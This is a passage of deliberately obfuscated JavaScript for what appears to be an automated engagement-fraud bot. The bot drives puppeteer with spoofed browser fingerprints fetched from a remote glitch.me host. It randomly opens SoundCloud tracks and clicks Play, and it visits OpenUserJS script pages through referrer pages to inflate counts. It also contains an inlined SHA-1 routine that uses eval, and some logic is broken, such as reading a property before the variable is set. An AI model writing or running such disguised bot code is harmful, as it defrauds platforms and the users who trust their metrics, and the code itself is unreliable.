      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + Z(0x11, 'EkI[') + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + a1(0xf) + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + a0(0xd) + 'hrome/108.' + '0.0.0\x20Safa' + a0(0x5),
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = -0x1b * 0x16b + 0xc38 + 0x1 * 0x1a11; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        let h = this[floor(random() * this['length'])];
        f['has'](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1fa0 + 0x1351 + 0xc4f);
    let h = e[f];
    if (c['nDaJHB'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x19d * -0x6 + -0x1546 + -0x6a * -0x1c, r, s, t = -0x1c1 + 0x989 * -0x1 + 0xb4a; s = m['charAt'](t++); ~s && (r = q % (-0x2121 + 0x5 * 0x2bd + -0x33e * -0x6) ? r * (-0x19ac + -0xd * -0x298 + 0x3e6 * -0x2) + s : s, q++ % (-0x1141 + -0x1 * -0x1fd3 + 0xe8e * -0x1)) ? o += String['fromCharCode'](0x2691 + -0x14dc + -0x5d * 0x2e & r >> (-(0x4b * 0x4a + 0x1e * -0x31 + -0xfee) * q & -0x2 * -0xf94 + -0x16a0 + 0x2 * -0x441)) : -0x5 * 0xa3 + 0x647 + -0x318) {
          s = n['indexOf'](s);
        }
        for (let u = -0x13 * -0x12 + -0x155c + -0x1406 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x355 * -0x2 + -0x22a4 + 0x1c0a))['slice'](-(-0x114e * -0x2 + 0xcd1 * 0x1 + 0x3d * -0xc7));
        }
        return decodeURIComponent(p);
      };
      c['qSKDvt'] = i, b = arguments, c['nDaJHB'] = !![];
    }
    const j = e[-0x1b * 0x16b + 0xc38 + 0x1 * 0x1a11],
      k = f + j,
      l = b[k];
    return !l ? (h = c['qSKDvt'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const aU = [
    'mdeYmZq1nJC4oq',
    'ChrZlZq1nJG1nq',
    'WONcTre',
    'lw1VB21VBY1PBW',
    'bytes',
    'CMKVntm3lJm2',
    'W73cN3RdRf5qWQCQiCoq',
    'zs81mwn0BY5JBW',
    'https://me',
    'Ahr0Chm6lY9NCG',
    'v2LUnJq7ihG2na',
    'easyfork.o',
    'W77dGvSTlrVdUG',
    'zsbhzwnRBYKGqW',
    'pts/by-sit',
    'rg/scripts',
    'r0vu',
    'W4xcHmoPWR9AtmkWWQjwWQS'
  ];
  a = function() {
    return aU;
  };
  return a();
}
HookManager['prototypes']();
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = 0x1a82 + -0xffd * -0x2 + 0x1 * -0x3a7b, q) {
        const u = await q['waitForSel' + 'ector'](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1cd * 0x5 + 0xad6 + 0x3 * -0x9c)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= -0x22cd + -0x23 * -0x32 + 0x1bf7 + 0.3) {
            const u = await s['newPage']();
            let v = -0x255 + -0x1 * 0x252d + -0x2 * -0x13c1;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', -0xf8f + 0x105 * -0x25 + 0x3549 * 0x1, u), await wait(-0x70ff * -0x2 + 0xf63d + -0x12873 + getRandomInt(-0x4f23 + 0x72a8 + 0x1713, 0x64c2 + 0x9823 + -0x7 * 0x1363));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](0x243 * 0x6 + -0x1154 + -0x6b * -0x9), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = 0x15be * -0x1 + 0x6eb + 0xed3;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, -0x1efa + 0xc * -0x336 + 0x4d52 + floor((-0x116c + 0xa9 * 0x20 + -0x1a * -0x2) * random()))), await B['evaluate'](() => {
              const a2 = c;
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = (a2(0x0) + 'abcdef')['split'](''), F = [
                -(0xc29178ee + -0x2249cf05 * 0x4 + 0x11f645 * 0x3ee),
                0x8 * 0x195e59 + -0x5be183 + -0x63 * -0x2bc9,
                -0xe231 + 0x3e0c + -0x8f * -0x20b,
                -0x5c * 0x5a + 0x10e2 + 0xff6
              ], G = [
                -0x1eef + 0x1 * 0x144f + 0xab8,
                0x5 * -0x23f + 0x1b3e + -0x3 * 0x551,
                0x586 + 0x1737 + -0x1cb5,
                0x1 * 0xa61 + 0x18ea + -0x234b
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(0x16bd * -0x1 + 0xc08 + 0xab6)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = -0x2584 + 0x6d7 + 0x1ead; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(-0x7b2 + 0x1820 + -0x106e) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    const a3 = d;
                    R ? (I[0x1f41 + -0xabe + 0x1 * -0x1483] = I[-0xdce + -0x8 * 0x2bd + 0x11e3 * 0x2] = I[0xb50 + 0x1c33 * 0x1 + -0x1 * 0x2782] = I[0xcf * 0x2d + -0x8a5 * -0x3 + -0x3e50] = I[-0x7 * 0x15b + -0x6b * 0x2b + 0x1b79] = I[-0x11a * -0x1 + -0x213 * -0x7 + -0xf9b] = I[0xf55 + 0xea7 + -0x1df7] = I[0x2408 + 0xfec + -0x33ee] = I[0xd * 0x29d + 0x1bdd + -0x3dcf] = I[-0x106 * -0x1e + 0x3 * 0x49e + 0x116 * -0x29] = I[0x2b6 + 0x406 + -0x31 * 0x23] = I[-0x4b * 0x56 + -0x9ea + 0x2326] = I[0x2295 + -0x384 + -0x1f06] = I[0xaf1 * -0x3 + 0x12d5 * -0x1 + 0x33b4] = I[-0x3db * -0x2 + 0x210f + 0x28b8 * -0x1] = I[-0x329 * 0x3 + 0x300 * 0xc + -0x10f * 0x19] = I[0xe8 + 0xd09 + 0x1 * -0xde2] = -0x43b * -0x5 + -0x20e7 + 0x4 * 0x2f0, this['blocks'] = I) : this['blocks'] = [
                      0x941 + -0x3 * -0x990 + -0x25f1,
                      -0x192 * 0x7 + 0x35e + -0x7a * -0x10,
                      0x6c1 + -0x1 * -0xc93 + -0x1354 * 0x1,
                      -0x253e + 0x26bd + -0x17f,
                      -0x15af + -0x1 * 0x425 + -0x74 * -0x39,
                      -0x1693 * 0x1 + 0x148d * 0x1 + 0x206,
                      0xb79 + -0x2 * 0x12a1 + 0x19c9,
                      0x166e + 0x1 * -0x7f5 + -0xf7 * 0xf,
                      0x10 * 0xc5 + 0x6 * -0xa + 0x2 * -0x60a,
                      0x1 * 0x2702 + 0xb36 + 0x191c * -0x2,
                      -0xa7 * -0x38 + 0x2548 + -0x49d0,
                      0x1527 + 0x3c7 + -0x18ee,
                      0x5b * 0x5 + 0x14e3 + -0x16aa * 0x1,
                      0x15d2 + 0x17d3 + -0x2da5,
                      0x506 * 0x3 + -0x2 * 0x89b + -0x2 * -0x112,
                      -0x5 * 0x6c5 + -0x2598 + -0x1 * -0x4771,
                      0x2a1 * 0x3 + -0x25d8 + 0x1df5
                    ], this['h0'] = 0x2a528f23 * -0x3 + 0x415d4323 * 0x1 + 0xa4df8d47, this['h1'] = 0x1 * 0x1af3b74df + 0x4 * -0x1f4765ce + -0x3806 * 0x12f05, this['h2'] = -0x5fab2bd * 0x2 + -0x15b45f2a * 0x3 + 0xe5cd5ff6, this['h3'] = 0x148fa717 + -0x7 * 0x34de98d + 0x12c4103a, this['h4'] = -0x18562f4e6 + 0x10c69f8d * 0x6 + 0x1e48e1988, this['block'] = this['start'] = this[a3(0x4)] = this['hBytes'] = -0xb * -0x102 + 0x79d + -0x12b3, this['finalized'] = this['hashed'] = -0x227c + 0xfc1 + -0x7 * -0x2ad, this['first'] = -0x1d * -0x52 + -0xb * -0x31d + 0xc7 * -0x38;
                  }
                  ['update'](R) {
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = 0x59 * 0x1 + -0x5 * 0x1db + 0x8ee, W = R['length'] || -0x16f + 0x1261 * -0x2 + 0x2631, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = -0x2152 + -0x60 * -0x60 + -0x2ae, X[-0x1962 + 0x1 * 0x269b + -0x1 * 0xd39] = this['block'], X[-0x1b1d + -0x43e * 0x2 + 0x23a9] = X[-0xa4f * -0x3 + 0x1b10 + -0x39fc] = X[0x19af + -0x1 * 0x2333 + 0x35 * 0x2e] = X[-0xf5 * -0x1c + 0xb * -0x29f + 0x20c] = X[-0x1 * 0xad1 + -0xf * -0x25f + -0x4 * 0x62f] = X[-0x1e44 + -0x1 * 0x148d + 0x32d6] = X[-0x1 * 0x19ab + -0x4d * 0x61 + 0x36de * 0x1] = X[-0x9cf + 0x1 * 0x147d + 0xaa7 * -0x1] = X[0x191 * 0x13 + 0x14c5 + 0x650 * -0x8] = X[0x1c36 * -0x1 + 0x4a8 + 0x1797] = X[0x10d0 * -0x2 + 0xa4b + 0x175f] = X[-0xd92 + 0x17cb + -0xa2e * 0x1] = X[-0x793 * 0x2 + 0x3 * -0x2cc + 0x1796] = X[0x2705 * -0x1 + 0x12e * -0x1 + 0x2840] = X[0x1 * 0x21c1 + 0x26c9 + -0x487c] = X[-0x7dd + 0x10c1 + -0x143 * 0x7] = -0x2 * -0xfc7 + -0xc7 * 0x2b + 0x1df * 0x1), S) {
                          for (V = this['start']; U < W && V < 0x262b + 0x8 * 0x198 + -0x32ab; ++U)
                            X[V >> 0x1e97 * -0x1 + 0x183b + 0x65e] |= R[U] << G[0x110 * -0x16 + 0x13c4 + 0x39f & V++];
                        } else {
                          for (V = this['start']; U < W && V < 0x5d8 + -0x15fd * -0x1 + -0x1b95; ++U)
                            (T = R['charCodeAt'](U)) < 0x1989 + -0x26f5 + 0x9 * 0x18c ? X[V >> 0x2149 + 0x2703 + -0x484a] |= T << G[0x279 + -0x1458 + -0xda * -0x15 & V++] : T < 0x7f * -0xe + -0xd64 + 0x1c56 ? (X[V >> 0x1e * 0x13d + -0x47 * 0x4f + -0x22d * 0x7] |= (0x1 * -0x265 + -0x17 * 0xa7 + 0xca * 0x17 | T >> -0x1bb * 0x6 + 0xc2e * -0x2 + 0x22c4) << G[0x3 * -0x6c3 + -0x1d2 * -0x13 + -0xe4a & V++], X[V >> -0x963 + -0x43e + 0xda3] |= (0x71 * 0x2e + -0x1e37 + 0xa69 | 0x2f5 * 0x1 + -0x20ec + 0x6 * 0x509 & T) << G[-0x13 * 0xc3 + -0x10a5 * -0x1 + -0x229 & V++]) : T < -0x8c6a * 0x2 + 0x1 * 0x11fab + 0xd129 || T >= -0x1a6a3 * 0x1 + -0x167f7 + 0x3ee9a ? (X[V >> 0x3 * 0x878 + 0x2b8 + 0x7a * -0x3b] |= (-0x1bd7 + -0x1 * 0x282 + 0x1f39 | T >> 0xa0f + 0x1 * 0x2054 + -0x2a57) << G[0x119 * -0x1d + -0x230d + 0x1 * 0x42e5 & V++], X[V >> -0x1613 + -0x654 + 0x1c69] |= (-0x1 * -0x897 + -0x3d1 * -0x1 + -0xbe8 | T >> -0x1a3e + -0x1100 + 0x2b44 & -0x2133 + -0x1f * -0xf3 + 0x405) << G[-0xa * 0x3a5 + -0x24 * 0xd3 + -0x13 * -0x37b & V++], X[V >> 0x62 * 0x1 + 0x196e + -0x89a * 0x3] |= (0x827 + -0x2509 + 0x1d62 | 0x60 * -0x61 + 0x3 * 0x121 + -0x2c5 * -0xc & T) << G[-0x5b7 * 0x4 + 0x19e2 * 0x1 + -0x303 & V++]) : (T = -0x35 * 0xab + -0x159b8 + 0xd3 * 0x305 + ((-0x1 * 0x1fc + -0x18b * -0x8 + -0xb5 * 0x9 & T) << -0x161 * -0x13 + 0x107b * 0x1 + -0x2aa4 | -0xefa + -0x17f5 * -0x1 + -0x16 * 0x3a & R['charCodeAt'](++U)), X[V >> -0x4b * -0x18 + 0x46 * 0xf + 0x59 * -0x20] |= (0x308 + 0x36f + -0x587 | T >> 0x223 + -0x3 * 0x71d + 0x1346) << G[-0x334 + -0x4db + 0x812 & V++], X[V >> -0x95 * -0x1f + 0x1df7 + -0x3000] |= (0x1649 + 0x56d * -0x1 + -0x105c | T >> -0x1 * -0xfd2 + -0x1e13 + 0xe4d & 0x259 * -0x9 + -0x1025 * -0x2 + -0xaea) << G[-0x49 * 0x53 + -0x17be + 0x2f6c & V++], X[V >> 0x816 + -0x1ea8 + 0x1694] |= (-0x2d9 + 0x6f9 * -0x3 + 0x2 * 0xc22 | T >> -0x5 * 0x69 + -0x174a + 0x195d & -0x18d0 + -0x1d5 * -0xc + 0x313) << G[0x4f * -0x42 + 0x940 + 0xb21 & V++], X[V >> 0x1b65 + -0x2 * -0x2a1 + -0x20a5] |= (-0x3 * 0x6ea + -0x4 * 0x338 + 0xb * 0x31a | -0xe9 * -0x22 + 0x10a0 + -0x2f53 & T) << G[-0x21da + 0x28c + 0x1f51 & V++]);
                        }
                        this['lastByteIn' + 'dex'] = V, this['bytes'] += V - this['start'], V >= -0x16ab + -0x220d + -0x4 * -0xe3e ? (this['block'] = X[0x1152 * 0x2 + -0xd59 * -0x1 + -0x2fed], this['start'] = V - (-0x53 * 0x6d + -0x2335 + 0x46cc), this['hash'](), this['hashed'] = -0x774 * 0x2 + 0xbd5 * -0x3 + 0x3268) : this['start'] = V;
                      }
                      return this['bytes'] > 0x1 * -0x1c55d3b6b + -0x1041dd4a3 + 0x3c97b100d && (this['hBytes'] += this['bytes'] / (-0x95f2f8 * -0x195 + 0xe4d6b31 * 0x4 + -0x266f0f1c) << 0x264c + 0x26c3 + -0x4d0f, this['bytes'] = this['bytes'] % (0x14db9d220 + 0x2 * 0xe0205f56 + 0x4 * -0x837ea433)), this;
                    }
                  }
                  ['finalize']() {
                    if (!this['finalized']) {
                      this['finalized'] = 0x1414 + 0x118 * 0x13 + -0x1 * 0x28db;
                      var R = this['blocks'],
                        S = this['lastByteIn' + 'dex'];
                      R[-0x11fb * 0x1 + 0x141b * -0x1 + 0x26 * 0x101] = this['block'], R[S >> -0xbc6 + 0x21b * 0x1 + 0x9ad] |= F[0x1b86 + -0x15b3 + -0xc * 0x7c & S], this['block'] = R[0x1c96 + -0x1fe6 + 0xd8 * 0x4], S >= -0x142 + 0x8d3 + -0x759 && (this['hashed'] || this['hash'](), R[0x7c8 + 0x2264 + 0x2 * -0x1516] = this['block'], R[0xe00 + -0x1927 * 0x1 + 0x3 * 0x3bd] = R[0x5 * -0x56 + 0xc40 * 0x2 + -0x16d1] = R[-0x1b2 * 0x13 + -0xf1 * 0xd + 0x13 * 0x257] = R[0x5d * -0x59 + -0x2128 + 0x1 * 0x4180] = R[-0x11 * 0x57 + -0x2a * 0x5f + 0x1561] = R[0x237c + -0x1d * 0xc1 + 0x1 * -0xd9a] = R[0x26c6 + -0xdf6 + -0x18ca] = R[0xf7d + 0x1 * 0x1cf + -0x1145] = R[-0x11b3 + -0xff * 0xc + 0x1daf] = R[0x25 * -0x3 + -0x1f1f + 0x1f97] = R[-0x7f4 + 0x3 * 0x499 + -0x5cd] = R[0x536 * -0x7 + -0x1b9a + -0x929 * -0x7] = R[-0x1c54 + -0x1 * -0x564 + 0x16fc * 0x1] = R[-0x2150 + -0x1 * -0x1bce + 0x58f] = R[0x1232 + 0x1fcb + -0x31ef] = R[-0x1802 * -0x1 + -0x11f1 + -0x602] = -0x2412 + 0x17cd + -0x15d * -0x9), R[0xa * 0x37c + -0x1af * 0x3 + -0x1dbd] = this['hBytes'] << 0xc4c + -0x192 * 0x3 + -0x793 | this['bytes'] >>> 0x1a21 * -0x1 + -0x24c4 + 0xc9a * 0x5, R[0x933 + 0x26e6 * 0x1 + -0x300a] = this['bytes'] << -0x2 * 0x1271 + 0x13e1 + -0x1104 * -0x1, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = 0x249 * 0x11 + -0x11ac + -0x17 * 0xeb; R < 0x215b + -0x410 * -0x4 + -0x314b; ++R)
                      S = Y[R - (-0x18d4 + 0x132e + 0x1 * 0x5a9)] ^ Y[R - (0x2162 + 0x56 * -0x3 + -0x48 * 0x73)] ^ Y[R - (0x268f + -0x13 * -0x12a + -0x7 * 0x8a9)] ^ Y[R - (0x1 * -0x16a7 + -0x1591 * 0x1 + 0x2c48)], Y[R] = S << -0x24ea + -0x2589 + 0x4a74 | S >>> -0x25 * 0xfe + 0x23bd + -0x1 * -0x118;
                    for (R = -0xeed * -0x2 + 0x5 * 0x4 + 0xef7 * -0x2; R < -0x6eb + -0x1aad + -0x2 * -0x10d6; R += 0x233 * 0x4 + 0x1 * -0x202 + -0x6c5 * 0x1)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x303 + -0x1961 * 0x1 + 0x1663 * 0x1 | T >>> -0x21ce + 0x2 * -0x126c + -0x1 * -0x46c1) + (U & V | ~U & W) + X + (-0x41f44427 + 0x4c3da04d * 0x2 + 0x15 * 0x308c0e) + Y[R] << -0x6 * -0x2e7 + 0x24f7 + -0x3661) << -0x36 * 0x27 + 0x8 * -0x10d + 0x10a7 | X >>> 0x117 * -0x1 + -0x26a5 + -0x149 * -0x1f) + (T & (U = U << -0x4 * -0x812 + 0x13 + 0x1 * -0x203d | U >>> 0x2 * -0xaed + 0x5ff + 0xfdd) | ~T & V) + W + (0x1a4 * 0x1b446f + 0x6898e * 0x54b + 0xb2c20e3) + Y[R + (-0x183e * -0x1 + 0x1a3c + 0x3 * -0x10d3)] << -0xb * 0x123 + -0x1fa4 + 0x3 * 0xeb7) << 0x1e7e + -0x17b * 0x17 + -0x1 * -0x394 | W >>> 0x7d2 * -0x3 + -0x256 * -0x1 + 0x153b * 0x1) + (X & (T = T << 0x9b2 + -0x7fb * -0x2 + -0x198a | T >>> 0x1f4c + 0x3 * 0x6a1 + -0x332d) | ~X & U) + V + (0x2db6ec7 * 0x20 + -0x2ebd3ee * -0x10 + -0x1 * 0x2fa89e27) + Y[R + (-0x361 * 0x2 + -0x793 * -0x2 + -0x862)] << -0x1 * 0x26d7 + -0xc60 + -0x751 * -0x7) << 0x13b7 + 0x194d + -0x2cff | V >>> 0xe55 + -0x1 * -0xd76 + -0x1bb0) + (W & (X = X << 0x3 * 0x556 + -0x484 + -0x20 * 0x5b | X >>> -0x773 * -0x4 + 0x1b * -0xf4 + -0x40e) | ~W & T) + U + (0x17b8135d + 0x16d813d4 + -0x6b2 * -0x69054) + Y[R + (-0x1b2 + 0x1 * -0x1c11 + 0x2 * 0xee3)] << -0x1 * -0x77f + 0xb39 + -0x12b8) << -0xa23 + 0x17a5 * 0x1 + 0x47f * -0x3 | U >>> 0x22fc + 0x63 * 0x9 + -0x1eb * 0x14) + (V & (W = W << -0xc5d + 0x1638 + -0x9bd | W >>> -0x1e4a + 0x6c2 + -0x83 * -0x2e) | ~V & X) + T + (-0x9 * -0xa95d78b + 0x7b5aebc4 + 0x2c8fa91 * -0x2e) + Y[R + (-0x1f32 + -0x1 * 0x190f + 0x3845)] << -0x1f14 + 0x31a + 0x1bfa, V = V << 0x270a + -0xb64 + -0x1b88 | V >>> -0x166d + 0xc69 + -0x2 * -0x503;
